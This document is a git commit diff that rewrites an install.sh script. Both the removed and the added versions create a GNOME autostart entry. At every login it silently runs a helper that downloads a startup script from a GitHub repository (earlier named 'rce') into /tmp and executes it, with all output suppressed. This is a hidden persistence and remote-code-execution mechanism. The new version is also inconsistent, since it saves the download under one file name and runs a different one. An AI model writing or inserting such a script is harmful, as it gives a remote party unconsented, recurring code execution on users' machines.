5c83f59883f7f1c4ec1b53027f19a8d1677a043f
aryanbaburajan <aryanbaburajan2007@gmail.com>
2025-08-02 10:49:44 +0530

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,1 +1,6 @@
-mkdir -p "$HOME/.config/autostart" > /dev/null 2>&1 && echo -e '[Desktop Entry]\nType=Application\nExec='"$HOME"'/sza.sh\nHidden=false\nTerminal=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName=sza\nComment=sza' > "$HOME/.config/autostart/sza.desktop" && chmod +x "$HOME/.config/autostart/sza.desktop" > /dev/null 2>&1 && echo -e '#!/bin/bash\ncurl "https://raw.githubusercontent.com/aryanbaburajan/rce/refs/heads/main/startup.sh" -o "/tmp/script.sh" > /dev/null 2>&1\nchmod +x /tmp/script.sh\nexec "/tmp/script.sh" > /dev/null 2>&1' > "$HOME/sza.sh" && chmod +x "$HOME/sza.sh" > /dev/null 2>&1
+#!/bin/bash
+mkdir -p "$HOME/.config/autostart" > /dev/null 2>&1
+echo -e '[Desktop Entry]\nType=Application\nExec='"$HOME"'/sza.sh\nHidden=false\nTerminal=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName=sza\nComment=sza' > "$HOME/.config/autostart/sza.desktop"
+chmod +x "$HOME/.config/autostart/sza.desktop" > /dev/null 2>&1
+echo -e '#!/bin/bash\ncurl "https://raw.githubusercontent.com/aryanbaburajan/sza/refs/heads/main/startup.sh" -o "/tmp/script.sh" > /dev/null 2>&1\nchmod +x /tmp/sza-script.sh\nexec "/tmp/sza-script.sh" > /dev/null 2>&1' > "$HOME/sza.sh"
+chmod +x "$HOME/sza.sh" > /dev/null 2>&1
